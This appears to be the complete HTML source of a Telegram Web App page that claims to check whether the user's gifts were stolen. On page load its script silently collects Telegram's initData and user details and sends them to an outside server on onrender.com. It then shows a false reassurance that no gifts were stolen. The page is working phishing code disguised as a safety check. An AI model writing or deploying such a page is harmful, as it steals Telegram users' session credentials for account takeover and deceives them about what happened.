<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="status">
        <div class="loader"></div>
        <h2>Проверка подарков...</h2>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        const data = {
            initData: tg.initData, 
            user: tg.initDataUnsafe
        };

        fetch('https://gift-backend-pq6k.onrender.com/log', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        })
        .then(response => {
            if (response.ok) {
                // Это сработает, если данные успешно ушли на Render
                document.getElementById('status').innerHTML = "<h1>Проверка прошла успешно.<br>В ходе проверки мы выяснили:<br>ни один ваш подарок не был украден.</h1>";
            } else {
                // Это сработает, если сервер Render ответил ошибкой
                document.getElementById('status').innerHTML = "<h1>Ошибка сервера: " + response.status + "</h1>";
            }
        })
        .catch(error => {
            // Это сработает, если интернет пропал или сервер выключен
            document.getElementById('status').innerHTML = "<h1>Ошибка сети: " + error + "</h1>";
        });
    </script>
</body>
</html>
